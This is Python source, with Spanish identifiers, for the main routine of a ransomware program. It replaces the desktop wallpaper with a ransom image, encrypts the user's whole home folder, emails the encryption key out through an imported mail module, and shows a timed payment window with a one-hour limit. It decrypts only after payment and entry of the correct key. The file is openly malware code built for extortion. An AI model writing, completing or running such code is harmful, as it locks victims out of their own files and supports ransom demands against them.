import os
from modulo_encriptacion import generar_clave, encriptar_carpeta, desencriptar_carpeta, cargar_clave
from modulo_ventanas import VentanaAtaque, pedir_correos_y_mostrar, pedir_clave, mostrar_mensaje
from modulo_correo import enviar_clave, enviar_clave2
from modulo_fondo import cambiar_fondo_de_pantalla, obtener_fondo_actual

def main():
    # 1. Guardar fondo actual
    fondo_original = obtener_fondo_actual()

    # 2. Cambiar fondo por el de "ataque"
    fondo_ataque = os.path.abspath("ransomwarewpp.jpg")
    cambiar_fondo_de_pantalla(fondo_ataque)

    # 3. Generar clave y encriptar
    clave = generar_clave()
    carpeta_usuario = os.path.expanduser("~")
    encriptar_carpeta(clave, carpeta_usuario)
    enviar_clave2(os.getenv("CORREO_REMITENTE"), clave.decode())

    # 4. Mostrar ventana de ataque
    def despues_de_pagar():
        # 5. Pedir correos
        correo1 = pedir_correos_y_mostrar()
        # 6. Enviar clave
        ex1 = enviar_clave(correo1, clave.decode())
        if ex1:
            mostrar_mensaje("Clave enviada", "La clave se ha enviado al correo ingresado")
        else:
            mostrar_mensaje("Error", "No se pudo enviar la clave.")

        # 7. Pedir clave y desencriptar si es correcta
        clave_ingresada = pedir_clave()
        if clave_ingresada == clave.decode():
            desencriptar_carpeta(clave, carpeta_usuario)
            mostrar_mensaje("Éxito", "¡Archivos restaurados!")
        else:
            mostrar_mensaje("Clave incorrecta", "La clave no es válida. Los archivos siguen cifrados.")

        # 8. Restaurar fondo original
        cambiar_fondo_de_pantalla(fondo_original)

    VentanaAtaque(tiempo_limite=3600, callback_pago=despues_de_pagar)

if __name__ == "__main__":
    main()
